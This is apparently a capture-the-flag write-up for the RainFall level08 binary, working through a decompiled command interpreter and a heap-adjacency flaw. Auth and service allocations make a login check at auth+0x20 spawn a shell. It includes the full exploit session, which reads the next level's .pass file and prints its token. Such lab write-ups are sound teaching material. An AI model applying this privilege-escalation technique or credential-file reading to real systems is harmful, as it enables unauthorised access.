# level08

1. Decompilation with Ghidra

    The binary contains a command interpreter with several commands:

    ```c
    undefined4 main(void)
    {
        char local_90 [5];
        char local_8b [2];
        char acStack_89 [125];
        
        do {
            printf("%p, %p \n",auth,service);
            fgets((char *)local_90,0x80,stdin);
            
            if (strncmp(local_90, "auth ", 5) == 0) {
                auth = (char *)malloc(4);
                auth[0] = '\0';
                if (strlen(local_8b) < 0x1f) {
                    strcpy(auth,local_8b);
                }
            }
            
            if (strncmp(local_90, "reset", 5) == 0) {
                free(auth);
            }
            
            if (strncmp(local_90, "service", 6) == 0) {
                service = strdup(acStack_89);
            }
            
            if (strncmp(local_90, "login", 5) == 0) {
                if (*(int *)(auth + 0x20) == 0) {
                    fwrite("Password:\n",1,10,stdout);
                }
                else {
                    system("/bin/sh");
                }
            }
        } while( true );
    }
    ```

2. Analysis of the vulnerability

    The vulnerability:
    - The `login` command checks if `*(auth + 0x20)` is non-zero to grant shell access.
    - `auth` is allocated with only 4 bytes via `malloc(4)`.
    - The `service` command allocates memory via `strdup()` which uses `malloc()`.
    - Due to heap allocation behavior, if we allocate `auth` then `service` with enough data, the `service` buffer will be placed adjacent to `auth` in memory.
    - This makes `*(auth + 0x20)` (32 bytes offset) point into the `service` buffer, allowing us to control its value.

3. Finding the exploit strategy

    Memory layout after allocations:

    ```
    auth     -> malloc(4)      at address X
    service  -> strdup("...") at address X + small_offset
    
    *(auth + 0x20) will read from service buffer if service is long enough
    ```

4. Exploitation

    Steps to exploit:

    1. Create an `auth` structure (allocates 4 bytes):

    ```bash
    auth A
    ```

    2. Allocate `service` with a string long enough to reach `auth + 0x20`:

    ```bash
    service CCCCCCCCCCCCCCCCCCCC
    ```

    3. Trigger the `login` command:

    ```bash
    login
    ```

    Full exploitation session:

    ```bash
    level8@RainFall:~$ ./level8
    (nil), (nil) 
    auth A
    0x804a008, (nil) 
    service CCCCCCCCCCCCCCCCCCCCC
    0x804a008, 0x804a018 
    login
    $ whoami
    level9
    $ cat /home/user/level9/.pass
    c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
    ```

5. Token discovered

    The token is: `c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`
